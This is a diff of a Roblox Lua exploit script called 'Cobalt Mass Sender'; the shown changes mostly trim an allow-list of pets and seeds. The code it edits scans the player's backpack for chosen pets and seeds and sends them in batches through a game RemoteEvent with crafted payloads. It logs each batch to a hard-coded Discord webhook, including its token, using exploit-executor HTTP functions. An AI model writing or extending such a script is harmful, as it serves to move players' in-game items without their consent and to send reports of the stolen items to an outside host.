@@ -1,6 +1,6 @@
 -- Cobalt Mass Sender – dynamically builds payloads from backpack attributes
-local ALLOWED_PETS = {"Unicorn","Bald Eagle","Monkey","Owl","Frog","Golden Dragonfly","Bunny","Bee","Turtle","Black Dragon","Ice Serpent","Bear","Butterfly","Firefly","Raccoon","Deer","Robin"}
-local ALLOWED_SEEDS = {"Hypno Bloom","Green Bean","Grape","Coconut","Mushroom","Acorn","Tomato","Dragon's Breath","Star Fruit","Moon Bloom","Briar Rose","Venom Spitter","Apple","Venus Fly Trap","Rocket Pop","Bamboo","Fire Fern","Corn","Pomegranate","Sunflower","Dragon Fruit","Cherry","Sun Bloom","Blueberry","Carrot","Mango","Cactus","Strawberry","Banana","Poison Apple","Tulip","Pineapple"}
+local ALLOWED_PETS = {"Robin"}
+local ALLOWED_SEEDS = {"Hypno Bloom","Green Bean","Grape","Coconut","Mushroom","Acorn","Tomato","Dragon's Breath","Star Fruit","Moon Bloom","Briar Rose","Venom Spitter","Apple","Venus Fly Trap","Rocket Pop","Bamboo","Fire Fern","Corn","Pomegranate","Sunflower","Dragon Fruit","Cherry","Sun Bloom","Blueberry","Carrot","Mango","Cactus","Banana","Poison Apple","Tulip","Pineapple"}
 local WEBHOOK = "https://discord.com/api/webhooks/1526222716275785839/65GIm7Yx4pfvQeUc11P8-E8Zc43wtzJiZjn9SVZ_s9CofmAqTe9LWPctE_TMJPkKDRqw"
 
 local Event = game:GetService("ReplicatedStorage").SharedModules.Packet.RemoteEvent
@@ -14,9 +14,9 @@ local seedLookup = {}
 for _, s in ipairs(ALLOWED_SEEDS) do seedLookup[s:lower()] = true end
 
 local function sendWebhook(msg)
-    local req = (type(request) == "function" and request) 
-        or (type(http_request) == "function" and http_request) 
-        or (syn and type(syn.request) == "function" and syn.request) 
+    local req = (type(request) == "function" and request)
+        or (type(http_request) == "function" and http_request)
+        or (syn and type(syn.request) == "function" and syn.request)
         or (http and type(http.request) == "function" and http.request)
     if req then
         pcall(req, {
@@ -54,7 +54,7 @@ while true do
     -- Scan for allowed seeds and pets (max 20 per batch)
     for _, item in ipairs(items) do
         if #queue >= 20 then break end
-        
+
         local mainCat = item:GetAttribute("MainCategory")
         if mainCat == "Seed" then
             local seedName = item:GetAttribute("SeedTool")
@@ -102,7 +102,7 @@ while true do
         Event:FireServer(buffer.fromstring(payload))
     end
 
-    -- Log sent items
+    -- Log sent items (escaped % for outer string.format)
     local logLines = {}
     for _, itemData in ipairs(queue) do
         table.insert(logLines, string.format("• %s (x%d) sent.", itemData.instance.Name, itemData.count))
